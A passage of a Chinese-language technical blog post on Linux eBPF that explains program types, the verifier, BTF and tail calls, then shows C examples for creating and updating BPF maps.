当你想要调试系统时，这种方法提供了更高级别的可预测性。</p><p>系统中的所有跟踪点都定义在目录<code>/sys/kernel/debug/tracing/events</code>中。在该目录下，每个子系统都包含任何跟踪点，并且可以将BPF程序附着到这些子系统。BPF跟踪点在<code>/sys/kernel/debug/tracing/events/bpf</code>中定义。 例如，可以在此处找到<code>bpf_prog_load</code>的跟踪点定义。 这意味着你可以编写一个BPF程序来检查其他BPF程序何时加载。</p><h4 id="XDP程序"><a href="#XDP程序" class="headerlink" title="XDP程序"></a>XDP程序</h4><p>XDP程序允许你编写在网络数据包到达内核时就执行的代码。 它们使用<code>BPF_PROG_TYPE_XDP</code>类型定义。 鉴于内核没有太多时间来处理信息本身，它只从数据包中公开一组有限的信息。 因为数据包是在早期执行的，所以你对如何处理该数据包有更高级别的控制。</p><p>XDP程序定义了几个可以控制的操作，并允许你决定如何处理该数据包。你可以从你的XDP程序中返回<code>XDP_PASS</code>，这意味着数据包应该被传递到内核中的下一个子系统。你还可以返回<code>XDP_DROP</code>，这意味着内核应该完全忽略此数据包，并且不对其进行任何其他操作。你还可以返回<code>XDP_TX</code>，这意味着数据包应该被转发回最初接收数据包的网卡接口(NIC)。</p><p>这种级别的控制使得网络层的处理更加灵活，XDP也已经成为BPF中的主要组件之一。在后续章节中，我们还会讨论XDP许多强大之处，例如保护你的网络免受分布式拒绝服务(DDoS)攻击。</p><h4 id="Perf-Event程序"><a href="#Perf-Event程序" class="headerlink" title="Perf Event程序"></a>Perf Event程序</h4><p>这些类型的BPF程序允许你将BPF代码附着到<code>Perf events</code>。它们使用<code>BPF_PROG_TYPE_PERF_EVENT</code>类型定义。<code>Perf</code>是内核中的一个内部分析器，它为硬件和软件发出性能数据事件。你可以使用它来监控许多事物，从计算机的CPU到系统上运行的任何软件。当你将BPF程序附着到<code>Perf events</code>时，你的代码将在每次<code>Perf</code>生成数据时执行。</p><h4 id="Cgroup-Socket程序"><a href="#Cgroup-Socket程序" class="headerlink" title="Cgroup Socket程序"></a>Cgroup Socket程序</h4><p>这些类型的程序允许你将BPF处理逻辑附着到控制组(cgroups)。它们使用<code>BPF_PROG_TYPE_CGROUP_SKB</code>类型定义。它们允许<code>cgroup</code>控制它们包含的进程内的网络流量。使用这些程序可以在将网络数据包交付<code>cgroup</code>中的进程之前决定如何处理它。内核尝试传递给同一<code>cgroup</code>中的任何进程的任何数据包都将通过这些过滤器之一。 同时，你可以决定当<code>cgroup</code>中的进程通过该接口发送网络数据包时要做什么。</p><p>你会发现，这些行为类似于<code>BPF_PROG_TYPE_SOCKET_FILTER</code>程序。 主要区别在于<code>BPF_PROG_TYPE_CGROUP_SKB</code>程序附着到一个<code>cgroup</code>内的所有进程，而不是特定进程；这种行为适用于在给定<code>cgroup</code>中创建的当前和以后的套接字。附着到<code>cgroup</code>的BPF程序在容器环境中非常有用，在这些环境下，进程组受<code>cgroup</code>约束，因此你可以将相同的策略应用于所有进程，而无需单独识别每个进程。<code>Cilium</code>是一个流行的开源项目，它为<code>Kubernetes</code>提供负载均衡和安全功能，在<code>cilium</code>中，广泛使用<code>cgroup</code>套接字程序将其策略应用于组而不是孤立的容器中。</p><h4 id="Cgroup-Open-Socket程序"><a href="#Cgroup-Open-Socket程序" class="headerlink" title="Cgroup Open Socket程序"></a>Cgroup Open Socket程序</h4><p>这些类型的程序允许你在<code>cgroup</code>中的任何进程打开网络套接字时执行代码。这种行为类似于附着到<code>cgroup</code>套接字缓冲区的程序，但不是让你在数据包通过网络时访问它们，而是允许你控制进程打开新套接字时发生的情况。它们使用<code>BPF_PROG_TYPE_CGROUP_SOCK</code>类型定义。 这对于可以打开套接字的程序组提供安全性和访问控制很有用，因为这样不必单独限制每个进程的功能。</p><h4 id="Socket-Option程序"><a href="#Socket-Option程序" class="headerlink" title="Socket Option程序"></a>Socket Option程序</h4><p>这些类型的程序允许你在运行时修改套接字连接选项，当数据包通过内核网络堆栈中的多个阶段时。它们附着到<code>cgroup</code>上，很像<code>BPF_PROG_TYPE_CGROUP_SOCK</code>和<code>BPF_PROG_TYPE_CGROUP_SKB</code>，但与那些程序类型不同的是，它们可以在连接的生命周期内多次调用。 该程序使用<code>BPF_PROG_TYPE_SOCK_OPS</code>类型定义。</p><p>当你创建一个这种类型的BPF程序时，你的函数调用会收到一个名为<code>op</code>的参数，它表示内核将要通过套接字连接执行的操作，因此，你就会知道程序在连接生命周期中的哪个时间点被调用。有了这些信息，你就可以访问网络IP地址和连接端口等数据，还可以修改连接选项以设置超时并更改给定数据包的往返延迟时间。</p><p>举个例子，<code>Facebook</code>使用它来为同一数据中心内的连接设置较短的设置重传超时(RTO)。RTO是系统在网络连接预计发生故障后恢复的时间。这个目标也代表了系统在遭受不可连接的情况下无法使用的时间。 在<code>Facebook</code>的案例中，它假设同一数据中心中的机器应该具有较短的RTO，并且使用 BPF 程序修改了这个阈值。</p><h4 id="Socket-Map程序"><a href="#Socket-Map程序" class="headerlink" title="Socket Map程序"></a>Socket Map程序</h4><p><code>BPF_PROG_TYPE_SK_SKB</code>程序让你可以访问套接字映射和套接字重定向。 套接字映射允许你保留对多个套接字的引用。当你有这些引用时，你可以使用特殊的帮助器将传入的数据包从一个套接字重定向到另一个套接字。当你想使用BPF实现负载均衡功能时，可以通过跟踪多个套接字在它们之间转发网络数据包，而无需离开内核空间。<code>Cillium</code>和<code>Facebook</code>的<code>Katran</code>等项目广泛使用这些类型的程序来控制网络流量。</p><h4 id="Cgroup-Device程序"><a href="#Cgroup-Device程序" class="headerlink" title="Cgroup Device程序"></a>Cgroup Device程序</h4><p>这种类型的程序允许你决定是否可以为给定设备执行<code>cgroup</code>中的操作。这些程序使用<code>BPF_PROG_TYPE_CGROUP_DEVICE</code>类型定义。 <code>cgroups (v1)</code>的第一个实现允许你为特定设备设置权限，然而，<code>cgroups（v2）</code> 缺少这个特性。引入这种类型的程序是为了提供该功能。同时，能够编写BPF程序可以让你在需要时更灵活地设置这些权限。</p><h4 id="Socket-Message-Delivery程序"><a href="#Socket-Message-Delivery程序" class="headerlink" title="Socket Message Delivery程序"></a>Socket Message Delivery程序</h4><p>这些类型的程序可以控制是否应该传递发送到套接字的消息。它们使用<code>BPF_PROG_TYPE_SK_MSG</code>类型定义。当内核创建<code>socket</code>时，它会将<code>socket</code>存储在<code>socket map</code>中。该<code>map</code>使内核可以快速访问特定的<code>socket</code>组。当你将套接字消息的BPF程序附着到<code>socket map</code>时，发送到这些<code>socket</code>的所有消息都将在传递它们之前被程序过滤。在过滤消息之前，内核会复制消息中的数据，以便可以处理它。这些程序有两个返回值：<code>SK_PASS</code>和<code>SK_DROP</code>。 如果你希望内核将消息发送到<code>socket</code>，则使用第一个，如果你希望内核忽略该消息，则使用后一个。</p><h4 id="RAW-Tracepoint程序"><a href="#RAW-Tracepoint程序" class="headerlink" title="RAW Tracepoint程序"></a>RAW Tracepoint程序</h4><p>我们之前谈到了一种访问内核中跟踪点的程序。内核开发人员添加了一个新的跟踪点程序来解决访问内核保存的原始格式的跟踪点参数。这种格式让你可以访问有关内核正在执行的任务的更详细信息，但是，它的性能开销很小。 大多数情况下你会希望在程序中使用常规跟踪点来避免这种性能开销，你也可以在需要时使用原始跟踪点访问原始参数。这些类型的程序被定义为<code>BPF_PROG_TYPE_RAW_TRACE POINT</code></p><h4 id="Cgroup-Socket-Address程序"><a href="#Cgroup-Socket-Address程序" class="headerlink" title="Cgroup Socket Address程序"></a>Cgroup Socket Address程序</h4><p>当用户空间程序由特定的<code>cgroup</code>控制时，这种类型的程序允许你操作用户空间程序所附加的IP地址和端口号。 当你希望确保一组特定的用户空间程序使用相同的IP地址和端口时，你的系统会使用多个IP地址。当你将这些用户空间程序放在同一个<code>cgroup</code>中时，这些BPF程序使你可以灵活地操作这些绑定。这确保了来自这些应用程序的所有传入和传出连接都使用BPF程序提供的IP和端口。这些程序类型定义为<code>BPF_PROG_TYPE_CGROUP_SOCK_ADDR</code></p><h4 id="Socket-Reuseport程序"><a href="#Socket-Reuseport程序" class="headerlink" title="Socket Reuseport程序"></a>Socket Reuseport程序</h4><p><code>SO_REUSEPORT</code>是内核中的一个选项，它允许同一主机中的多个进程绑定到同一端口。 当你想要跨多个线程分配负载时，此选项允许在接受的网络连接中获得更高的性能。<code>BPF_PROG_TYPE_SK_REUSEPORT</code>程序类型允许你编写<code>BPF</code>程序<code>hook</code>到内核来决定是否重用端口。如果你的BPF程序返回<code>SK_DROP</code>，你可以阻止程序重用同一个端口。当BPF程序返回<code>SK_PASS</code>时，你可以通知内核使用它自己的重用例程。</p><h4 id="Flow-Dissection程序"><a href="#Flow-Dissection程序" class="headerlink" title="Flow Dissection程序"></a>Flow Dissection程序</h4><p>流解析器是内核的一个组件，它跟踪网络数据包需要通过的不同层，从到达系统到交付到用户空间程序。 它允许你使用不同的分类方法来控制数据包的流动。内核中内置的解析器称为<code>Flower</code>分类器，防火墙和其他过滤设备使用它来决定如何处理特定的数据包。</p><p><code>BPF_PROG_TYPE_FLOW_DISSECTOR</code>程序旨在<code>hook</code>流解析器路径中的逻辑。 它们提供了内置解析器无法提供的安全保证，例如确保程序始终终止，这在内置解析器中可能无法保证。 这些BPF程序可以修改网络数据包在内核中所遵循的流。</p><h4 id="Other-BPF程序"><a href="#Other-BPF程序" class="headerlink" title="Other BPF程序"></a>Other BPF程序</h4><p>我们已经讨论了在不同环境中使用的程序类型，但还有一些其他的BPF程序类型我们还没有涉及。 在这里仅简要提及</p><ul><li><p>Traffic classifier程序</p><p><code>BPF_PROG_TYPE_SCHED_CLS</code>和<code>BPF_PROG_TYPE_SCHED_ACT</code>是两种类型的BPF程序，它们允许对网络流量进行分类并修改套接字缓冲区中数据包的某些属性。</p></li><li><p>Lightweight tunnel程序</p><p><code>BPF_PROG_TYPE_LWT_IN、BPF_PROG_TYPE_LWT_OUT、BPF_PROG_TYPE_LWT_XMIT 和 BPF_PROG_TYPE_LWT_SEG6LOCAL</code>是允许将代码附着到内核的轻量级隧道基础设施的BPF程序类型。</p></li><li><p>Infrared device程序</p><p><code>BPF_PROG_TYPE_LIRC_MODE2</code>程序允许通过连接到红外设备（例如遥控器）来附着BPF程序。</p></li></ul><p>以上这些程序是专门的，它们的使用尚未被社区广泛采用。</p><p>接下来，我们将讨论BPF如何确保你的程序在内核加载它们后不会导致系统发生灾难性故障。</p><h3 id="BPF校验器"><a href="#BPF校验器" class="headerlink" title="BPF校验器"></a>BPF校验器</h3><p>允许任何人在Linux内核中执行任何代码乍一听是一件很疯狂的事情。如果没有BPF验证器，在生产系统中运行BPF程序的风险会太高。用内核网络维护者之一<code>Dave S. Miller</code>的话来说，“唯一介于eBPF程序和一个黑暗破坏鸿沟之间的是eBPF验证器。”</p><p>显然，BPF验证器也是一个运行在系统上的程序，它能够仔细审查以确保正确完成它的工作。在过去几年中，安全研究人员在验证程序中发现了一些漏洞，这些漏洞允许攻击者访问内核中的随机内存，即使是非特权用户。你可以在CVE目录中阅读有关此类漏洞的更多信息。 例如，<code>CVE-2017-16995</code>描述了任何用户如何读写内核内存并绕过BPF验证程序。</p><p>验证程序执行的第一个检查是对虚拟机将要加载的代码的静态分析。 第一次检查的目的是确保程序有预期的结束。为此，验证器使用代码创建有向无环图 (DAG)。验证器分析的每条指令都成为图中的一个节点，每个节点都链接到下一条指令。验证器生成此图后，会执行深度优先搜索(DFS)，以确保程序完成并且代码不包含危险路径。 这意味着它将遍历图的每个分支，一直到分支的底部，以保证没有递归循环。</p><p>以下是验证器在第一次检查期间的一些条件：</p><ul><li>程序不包括控制循环。为了确保程序不会陷入无限循环，验证器拒绝任何类型的控制循环。已经有人提议在 BPF 程序中允许循环，但在撰写本文时，还没有一个被采用。</li><li>程序不会尝试执行超过内核允许的最大值的指令。此时，要执行的最大指令数为4096。这个限制是为了防止BPF永远运行。</li><li>程序不包含任何无法访问的指令，例如从未执行的条件或函数。这可以防止在虚拟机中加载死代码，这也会延迟BPF程序的终止。</li><li>程序不会试图跳出它的界限。</li></ul><p>验证器执行的第二项检查是BPF程序的试运行。 这意味着验证器将尝试分析程序将要执行的每条指令，以确保它不会执行任何无效指令。此次执行还检查所有内存指针是否被正确访问和取消引用。最后，试运行会通知验证器程序中的控制流，以确保无论程序采用哪条控制路径，它都到达<code>BPF_EXIT</code>指令。为此，验证器会跟踪堆栈中所有访问过的分支路径，并在采用新路径之前对其进行评估，以确保它不会多次访问特定路径。在这两项检查通过后，验证器认为程序是可以安全执行的。</p><p>如果你对如何分析程序感兴趣，bpf系统调用允许你进行调试验证程序的检查。 当你使用此系统调用加载程序时，可以设置几个属性，使验证程序打印其操作日志：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> bpf_attr attr = &#123; </span><br><span class="line">  .prog_type = type,</span><br><span class="line">.insns = ptr_to_u64(insns), </span><br><span class="line">  .insn_cnt = insn_cnt,</span><br><span class="line">.license =ptr_to_u64(license), </span><br><span class="line">  .log_buf =ptr_to_u64(bpf_log_buf), </span><br><span class="line">  .log_size = LOG_BUF_SIZE, </span><br><span class="line">  .log_level = <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br><span class="line">bpf(BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br></pre></td></tr></table></figure><p><code>log_level</code>字段告诉验证器是否打印任何日志。设置为1时会打印其日志，设置为0时不会打印任何内容。如果要打印验证器日志，还需要提供日志缓冲区及其大小。这个缓冲区是一个多行字符串，你可以打印它来检查验证器所做出的决定。</p><p>下一节将介绍BPF如何在内存中构造程序信息。程序的结构方式将有助于弄清楚如何访问BPF内部，帮助你更好的调试和理解程序的行为方式。</p><h3 id="BPF类型格式"><a href="#BPF类型格式" class="headerlink" title="BPF类型格式"></a>BPF类型格式</h3><p>BPF类型格式(BTF)是元数据结构的集合，可增强BPF 程序、映射和函数的调试信息。BTF包含源信息，因此我们在后续所讨论的<code>BPFTool</code>等工具可以向你展示对BPF数据的更丰富的解释。这些元数据存储在二进制程序中一个特殊的“.BFT”元数据部分下。BTF信息有助于使你的程序更易于调试，但它会显著增加二进制文件的大小，因为它需要跟踪程序中声明的所有内容的类型信息。BPF验证器也使用此信息来确保你的程序定义的结构类型是正确的。</p><p>BTF专门用于注释C语言类型。 像<code>LLVM</code>这样的BPF编译器知道如何为你包含这些信息，因此你无需完成将这些信息添加到每个结构的繁琐任务。然而，在某些情况下，工具链仍然需要一些注释来增强程序。在后续章节，我们将描述这些注释是如何发挥作用的，以及像<code>BPFTool</code>这样的工具是如何显示这些信息的。</p><h3 id="BPF尾调用"><a href="#BPF尾调用" class="headerlink" title="BPF尾调用"></a>BPF尾调用</h3><p>BPF程序可以通过尾调用调用其他BPF程序。 这是一个强大的功能，因为它允许你通过组合更小的BPF函数来组装更复杂的程序。<code>5.2</code>之前的内核版本对BPF程序可以生成的机器指令的数量有硬性限制。此限制设置为4096，以确保程序可以在合理的时间内终止。然而，随着人们构建更复杂的BPF程序，他们需要一种方法来扩展内核强加的指令限制，这就是尾调用发挥作用的地方。从内核版本<code>5.2</code>开始，指令限制增加到一百万条指令。尾调用嵌套也受到限制，在本例中为32个调用，这意味着你可以在一个链中组合多达32个程序来为遇到的问题提供解决方案。</p><p>当你从另一个BPF程序调用一个BPF程序时，内核会完全重置程序上下文。记住这一点很重要，因为你可能需要一种在程序之间共享信息的方法。每个BPF程序作为其参数接收的上下文对象不会帮助我们解决这个数据共享问题。 在下一章中，我们将讨论<code>BPF map</code>作为在程序之间共享信息的一种方式。我们还会展示如何使用尾调用从一个BPF程序跳转到另一个的示例。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://vinin.me/2022/04/10/Hello-eBPF/" target="_blank" rel="noopener">http://vinin.me/2022/04/10/Hello-eBPF/</a></li><li><a href="https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/" target="_blank" rel="noopener">https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/</a></li><li><p><a href="https://elixir.bootlin.com/linux/v5.5.19/source/samples/bpf" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v5.5.19/source/samples/bpf</a></p></li><li><p><a href="https://cloud.tencent.com/developer/article/1472857" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1472857</a></p></li><li><a href="https://blog.csdn.net/Xiongzhizhu/article/details/51816243" target="_blank" rel="noopener">https://blog.csdn.net/Xiongzhizhu/article/details/51816243</a></li><li><a href="https://blog.csdn.net/weixin_43847470/article/details/122145676" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43847470/article/details/122145676</a></li></ul><h2 id="第三章节"><a href="#第三章节" class="headerlink" title="第三章节"></a>第三章节</h2><h3 id="BPF映射"><a href="#BPF映射" class="headerlink" title="BPF映射"></a>BPF映射</h3><p>在程序中调用行为的消息传递是软件工程中广泛使用的技术。 一个程序可以通过发送消息来修改另一个程序的行为，这也允许在这些程序之间交换信息。 BPF最令人痴迷的一方面是，内核代码和被加载的代码可以在运行时使用消息传递相互通信。</p><p>在本章中，我们将介绍BPF程序和用户空间程序如何相互通信。我们描述了内核和用户空间之间的不同通信管道，以及它们如何存储信息。 我们还向你展示了这些管道的用例，以及如何使这些管道中的数据在程序初始化之间进行持久化。</p><p>BPF映射是驻留在内核中的<code>key/value</code>存储。 任何知道它们的BPF程序都可以访问它们。在用户空间中运行的程序也可以通过使用文件描述符来访问这些映射。只要事先正确指定数据大小，就可以在<code>map</code>中存储任何类型的数据。 内核将键和值视为二进制类型的大对象(blob)，它不关心你在<code>map</code>中保留的内容。BPF 验证器包含多种保护措施，以确保你所创建和访问<code>map</code>的方式是安全的。 </p><h4 id="创建BPF映射"><a href="#创建BPF映射" class="headerlink" title="创建BPF映射"></a>创建BPF映射</h4><p>创建BPF映射最直接的方法是使用bpf系统调用。当调用的第一个参数是<code>BPF_MAP_CREATE</code>时，是在告诉内核你想要创建一个新的映射。此调用将返回与你刚创建的<code>BPF Maps</code>关联的文件描述符标识符。系统调用中的第二个参数是此映射的配置：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> bpf_attr &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    __u32 map_type;<span class="comment">/* one of the values from bpf_map_type */</span></span><br><span class="line">    __u32 key_size;<span class="comment">/* size of the keys, in bytes */</span></span><br><span class="line">    __u32 value_size;<span class="comment">/* size of the values, in bytes */</span></span><br><span class="line">    __u32 max_entries;<span class="comment">/* maximum number of entries in the map */</span></span><br><span class="line">    __u32 map_flags;<span class="comment">/* flags to modify how we create the map */</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>系统调用中的第三个参数是此配置属性的大小。例如，你可以创建一个<code>hash map</code>来存储无符号整数作为键和值，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> bpf_attr my_map &#123; </span><br><span class="line">  .map_type = BPF_MAP_TYPE_HASH, </span><br><span class="line">  .key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>), </span><br><span class="line">  .value_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>), </span><br><span class="line">  .max_entries = <span class="number">100</span>,</span><br><span class="line">.map_flags = BPF_F_NO_PREALLOC,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> fd = bpf(BPF_MAP_CREATE, &amp;my_map, <span class="keyword">sizeof</span>(my_map));</span><br></pre></td></tr></table></figure><p>如果调用失败，内核将返回值-1。 失败的原因可能有三个。如果其中一个属性无效，内核将<code>errno</code>变量设置为<code>EINVAL</code>。 如果执行操作的用户没有足够的权限，内核会将<code>errno</code>变量设置为<code>EPERM</code>。 最后，如果没有足够的内存来存储映射，内核将<code>errno</code>变量设置为<code>ENOMEM</code>。</p><h4 id="创建BPF映射的ELF约定"><a href="#创建BPF映射的ELF约定" class="headerlink" title="创建BPF映射的ELF约定"></a>创建BPF映射的ELF约定</h4><p>内核包含一些约定和助手来生成和使用<code>BPF maps</code>。 你可能会发现这些约定比直接执行系统调用更频繁地出现，因为它们更具可读性且更容易遵循。请记住，这些约定仍然使用bpf系统调用来创建<code>map</code>，即使直接在内核中运行也是如此，如果不知道事先需要哪种<code>map</code>，你会发现直接使用系统调用更有用。</p><p>helper函数<code>bpf_map_create</code>包装了刚才看到的代码，以便更容易根据需要初始化<code>map</code>。我们可以使用它创建先前定义的<code>map</code>，只需一行代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line">fd = bpf_create_map(BPF_MAP_TYPE_HASH, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="number">100</span>,</span><br><span class="line">        BPF_F_NO_PREALOC);</span><br></pre></td></tr></table></figure><p>如果你知道你的程序需要哪种<code>map</code>，你也可以预先定义它。这有助于在程序预先使用的<code>map</code>中获得更高的可见性：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> my_map </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_HASH, </span><br><span class="line">  .key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>), </span><br><span class="line">  .value_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>), </span><br><span class="line">  .max_entries = <span class="number">100</span>,</span><br><span class="line">.map_flags =BPF_F_NO_PREALLOC, </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当您以这种方式定义<code>map</code>时，您使用的是所谓的<code>section</code>属性，在本例中为<code>SEC(&quot;maps&quot;)</code>。 这个宏告诉内核这个结构是一个BPF映射，它应该被相应地创建。你可能已经注意到，在这个新示例中，我们没有与<code>map</code>关联的文件描述符标识符。 在这种情况下，内核使用一个名为<code>map_data</code>的全局变量来存储有关程序中<code>map</code>的信息。 这个变量是一个结构数组，它按照你在代码中指定每个映射的方式排序。例如，如果前一个<code>map</code>是你的代码中指定的第一个<code>map</code>，你将从数组中的第一个元素获取文件描述符标识符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd = map_data[<span class="number">0</span>].fd;</span><br></pre></td></tr></table></figure><p>你还可以从此结构中访问<code>map</code>的名称及其定义， 此信息有时可用于调试和跟踪目的。初始化<code>map</code>后，你可以开始使用它们在内核和用户空间之间发送消息。 现在让我们看看如何使用这些<code>map</code>所存储的数据进行工作。</p><h3 id="与BPF映射工作"><a href="#与BPF映射工作" class="headerlink" title="与BPF映射工作"></a>与BPF映射工作</h3><p>内核和用户空间之间的通信将成为你编写的每个BPF程序的基础部分。 为内核编写代码时访问映射的<code>API</code>与为用户空间程序编写代码时不同。 本节介绍每个实现的语义和具体细节。</p><h4 id="更新BPF映射中的元素"><a href="#更新BPF映射中的元素" class="headerlink" title="更新BPF映射中的元素"></a>更新BPF映射中的元素</h4><p>创建任何<code>map</code>后，你可能希望用信息填充它。为此，内核助手提供了函数<code>bpf_map_update_elem</code>。 如果你在内核运行的程序中从<code>bpf/bpf_helpers.h</code>加载这个函数，与在用户空间运行的程序中从<code>tools/lib/bpf/bpf.h</code>加载它，这个函数的签名是不同的。这是因为在内核中工作时可以直接访问<code>map</code>，但在用户空间中工作时需要使用文件描述符引用它们。行为也略有不同，内核上运行的代码可以直接访问内存中的<code>map</code>，并且可以就地原子地更新元素。但是，在用户空间中运行的代码必须将消息发送到内核，内核会在更新<code>map</code>之前复制提供的值，这使得更新操作不是原子的。此函数在操作成功时返回0，在操作失败时返回负数。 在失败的情况下，全局变量<code>errno</code>将填充失败原因。 我们将在本章后面列出更多上下文的失败案例。</p><p>内核中的<code>bpf_map_update_elem</code>函数有四个参数。第一个是指向我们已经定义的<code>map</code>的指针。 第二个是指向我们要更新的键的指针。 因为内核不知道我们要更新的键的类型，所以这个方法被定义为一个指向<code>void</code>的不透明指针，这意味着我们可以传递任何数据。第三个参数是我们要插入的值。 此参数使用与<code>key</code>参数相同的语义。 在本书中，我们展示了一些如何利用不透明指针的高级示例。 你可以使用此函数中的第四个参数来更改<code>map</code>的更新方式。这个参数可以取三个值：</p><ul><li>如果你传递0，你告诉内核你想要更新元素如果它存在或不存在它都应该在映射中创建元素。</li><li>如果你传递1，你告诉内核只在元素不存在时创建它。</li><li>如果你传递2，内核只会在元素存在时更新它。</li></ul><p>这些值被定义为你可以使用的常量，而不必记住整数语义。值为<code>BPF_ANY</code>表示0，<code>BPF_NOEXIST</code>表示1，<code>BPF_EXIST</code>表示2。</p><p>让我们使用在上一节中定义的映射来编写一些示例。 在我们的第一个示例中，我们向<code>map</code>添加了一个新值。 因为<code>map</code>是空的，我们可以假设任何更新行为都是正常的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result;</span><br><span class="line">key = <span class="number">1</span>, value = <span class="number">1234</span>;</span><br><span class="line">result = bpf_map_update_elem(&amp;my_map, &amp;key, &amp;value, BPF_ANY); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Map updated with new element\n"</span>); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to update map with new value: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><p>在这个例子中，我们使用<code>strerror</code>来描述<code>errno</code>变量中的错误集。 你可以使用<code>man strerror</code>在手册页上了解有关此功能的更多信息。现在让我们看看当我们尝试创建具有相同键的元素时会得到什么结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result; </span><br><span class="line">key = <span class="number">1</span>, value = <span class="number">5678</span>;</span><br><span class="line">result = bpf_map_update_elem(&amp;my_map, &amp;key, &amp;value, BPF_NOEXIST); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Map updated with new element\n"</span>); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to update map with new value: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><p>因为我们已经在<code>map</code>中创建了一个键为1的元素，调用<code>bpf_map_update_elem</code>的结果将为-1，<code>errno</code>值为<code>EEXIST</code>。 该程序将在屏幕上打印以下内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failed to update <span class="built_in">map</span> with <span class="keyword">new</span> value: <span class="number">-1</span> (File exists)</span><br></pre></td></tr></table></figure><p>同样，让我们更改此程序以尝试更新一个不存在的元素：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result; </span><br><span class="line">key = <span class="number">1234</span>, value = <span class="number">5678</span>;</span><br><span class="line">result = bpf_map_update_elem(&amp;my_map, &amp;key, &amp;value, BPF_EXIST); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Map updated with new element\n"</span>); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to update map with new value: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><p>使用标志<code>BPF_EXIST</code>，此操作的结果将再次为-1。 内核会将<code>errno</code>变量设置为<code>ENOENT</code>，程序将打印以下内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failed to update <span class="built_in">map</span> with <span class="keyword">new</span> value: <span class="number">-1</span> (No such file <span class="keyword">or</span> directory)</span><br></pre></td></tr></table></figure><p>这些示例展示了如何从内核程序中更新映射。 你还可以从用户空间程序中更新映射。 执行此操作的助手与我们刚刚看到的类似， 唯一的区别是它们使用文件描述符来访问映射，而不是直接使用指向映射的指针。我们知道，用户空间程序总是使用文件描述符访问映射。 